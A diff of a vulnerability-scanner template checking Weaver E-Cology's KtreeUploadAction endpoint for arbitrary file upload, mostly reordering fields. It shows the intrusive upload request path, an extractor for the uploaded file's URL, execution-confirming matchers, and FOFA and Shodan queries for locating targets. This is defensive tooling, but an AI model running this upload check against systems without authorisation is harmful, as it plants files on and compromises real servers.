@@ -1,5 +1,4 @@
 id: weaver-ktreeuploadaction-file-upload
-
 info:
   name: Weaver E-Cology KtreeUploadAction - Arbitrary File Upload
   author: SleepingBag945
@@ -9,24 +8,38 @@ info:
   reference:
     - https://buaq.net/go-117479.html
   classification:
+    cwe-id:
+      - CWE-434
     cpe: cpe:2.3:a:weaver:e-cology:*:*:*:*:*:*:*:*
   metadata:
     runzero-review: REJECT/2025-11-07/excluding tag intrusive
-    verified: true
+    fofa-query: app="泛微-协同办公OA"
     max-request: 2
-    vendor: weaver
     product: e-cology
     shodan-query: ecology_JSessionid
-    fofa-query: app="泛微-协同办公OA"
-  tags: weaver,ecology,fileupload,intrusive,vuln
-
+    vendor: weaver
+    verified: true
+  tags: ecology,fileupload,intrusive,vuln,weaver
 variables:
-  num1: "{{rand_int(40000, 50000)}}"
-  num2: "{{rand_int(40000, 50000)}}"
-  result: "{{to_number(num1)*to_number(num2)}}"
-
+  num1: '{{rand_int(40000, 50000)}}'
+  num2: '{{rand_int(40000, 50000)}}'
+  result: '{{to_number(num1)*to_number(num2)}}'
 http:
-  - raw:
+  - extractors:
+      - group: 1
+        internal: true
+        name: filename
+        regex:
+          - ''',''url'':''(.*?)'',''title'
+        type: regex
+    matchers:
+      - condition: and
+        dsl:
+          - status_code_1 == 200 && contains_all(body_1,'original', 'SUCCESS')
+          - contains(body_2, '{{result}}') && status_code_2 == 200
+        type: dsl
+    matchers-condition: and
+    raw:
       - |
         @timeout: 20s
         POST /weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction?action=image HTTP/1.1
@@ -43,20 +56,3 @@ http:
         @timeout: 20s
         GET {{filename}} HTTP/1.1
         Host: {{Hostname}}
-
-    matchers-condition: and
-    matchers:
-      - type: dsl
-        dsl:
-          - "status_code_1 == 200 && contains_all(body_1,'original', 'SUCCESS')"
-          - "contains(body_2, '{{result}}') && status_code_2 == 200"
-        condition: and
-
-    extractors:
-      - type: regex
-        name: filename
-        group: 1
-        regex:
-          - "','url':'(.*?)','title"
-        internal: true
-
